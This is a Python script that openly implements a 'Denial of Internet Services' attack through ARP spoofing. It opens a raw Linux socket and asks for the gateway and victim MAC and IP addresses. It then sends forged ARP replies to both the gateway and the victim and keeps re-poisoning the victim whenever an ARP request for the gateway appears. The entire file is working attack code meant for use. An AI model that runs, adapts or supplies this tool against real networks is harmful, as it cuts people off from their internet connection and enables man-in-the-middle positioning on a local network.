'''
 Denial of Internet Services (DoIS) Attack Implementation, by ARP Spoofing

 By, Rishi Tharun <vrishitharunj@gmail.com>

'''

import socket
import sys

encoded_packet = b''
gateway_packet_list = []
victim_packet_list = []


def receiveAndProcessARP(tar_ipv4, victim_packet_list):
 try:
  while True:
   while True:
    try:
     received_packet = s.recv(1024)
    except:
     print("\n\nThe packet must have been lost... So try running the program again...")
     s.close()
     sys.exit(0)

    decoded_packet = []

    for i in range(len(received_packet)):
     decoded_packet.append(hex(received_packet[i])[2:])

    if decoded_packet[12:14] == ['8','6'] and decoded_packet[21] == '1':
     break
    else:
     pass

   dst_hw = ''
   dst_ipv4 = ''
   for i in range(6):
    dst_hw += decoded_packet[22+i]+'-'

   dst_hw = dst_hw[:-1]

   for i in range(4):
    dst_ipv4 += str(int('0x' + decoded_packet[38+i], 16)) +'.'

   dst_ipv4 = dst_ipv4[:-1]

   if dst_ipv4 == tar_ipv4:
    encoded_packet = b''
    for item in victim_packet_list:
     if(item >= 0x80):
      encoded_packet += chr(item).encode('utf-16')[2:3]
     else:
      encoded_packet += chr(item).encode('utf-8')[:]
    s.send(encoded_packet)
   else:
    pass
 except:
  return


### MAIN MODULE ###

try:
 s = socket.socket ( socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003) )
except:
 print ("\nError in Creating Socket. Run the code in a Linux Machine as Root User to avoid this error.")
 sys.exit(0)


while True:
 interface = input("\nEnter the Interface: ")
 try:
  s.bind((interface, 0))
  break
 except:
  print("\nInvalid Interface !")


while True:
 gateway_hw = input("\nEnter the Gateway MAC Address: ")
 if len (gateway_hw.split('-')) == 6 and '' not in gateway_hw.split('-'):
  break
 else:
  print ("\nMAC format is not as specified !")


while True:
 vic_hw = input("\nEnter the Victim MAC Address: ")
 if len (vic_hw.split('-')) == 6 and '' not in vic_hw.split('-'):
  break
 else:
  print ("\nMAC format is not as specified !")

while True:
 spoof_hw = input("\nEnter a Spoof MAC Address: ")
 if len (spoof_hw.split('-')) == 6 and '' not in spoof_hw.split('-'):
  break
 else:
  print ("\nMAC format is not as specified !")

for num in gateway_hw.split('-'):
 gateway_packet_list.append(int(num,16))

for num in spoof_hw.split('-'):
 gateway_packet_list.append(int(num,16))

for num in vic_hw.split('-'):
 victim_packet_list.append(int(num,16))

for num in spoof_hw.split('-'):
 victim_packet_list.append(int(num,16))

gateway_packet_list += [8,6,0,1,8,0,6,4,0,2]
victim_packet_list += [8,6,0,1,8,0,6,4,0,2]


while True:
 gateway_ipv4 = input("\nEnter the Gateway IPv4 Address: ")
 if len(gateway_ipv4.split('.')) == 4:
  break
 else:
  print ("\nIPv4 format is not as specified !")

while True:
 vic_ipv4 = input("\nEnter the Victim IPv4 Address: ")
 if len(vic_ipv4.split('.')) == 4:
  break
 else:
  print ("\nIPv4 format is not as specified !")


for num in spoof_hw.split('-'):
 gateway_packet_list.append(int(num,16))

for num in vic_ipv4.split('.'):
 gateway_packet_list.append(int(num))

for num in gateway_hw.split('-'):
 gateway_packet_list.append(int(num,16))

for num in gateway_ipv4.split('.'):
 gateway_packet_list.append(int(num))

for num in spoof_hw.split('-'):
 victim_packet_list.append(int(num,16))

for num in gateway_ipv4.split('.'):
 victim_packet_list.append(int(num))

for num in vic_hw.split('-'):
 victim_packet_list.append(int(num,16))

for num in vic_ipv4.split('.'):
 victim_packet_list.append(int(num))


for item in gateway_packet_list:
 if(item>=0x80):
  encoded_packet += chr(item).encode('utf-16')[2:3]
 else:
  encoded_packet += chr(item).encode('utf-8')[:]

s.send(encoded_packet)
print('\n\nARP Spoof sent to the Gateway...')

encoded_packet = b''


for item in victim_packet_list:
 if(item >= 0x80):
  encoded_packet += chr(item).encode('utf-16')[2:3]
 else:
  encoded_packet += chr(item).encode('utf-8')[:]


s.send(encoded_packet)

print('\n\nARP Spoof sent to the Victim...\n\nDoIS Attack Session Started...\n\nPress Ctrl + C to terminate the Session...')

receiveAndProcessARP(gateway_ipv4,victim_packet_list)

print('\n\nDoIS Attack Session Stopped...\n\nClosing the socket...')

s.close()
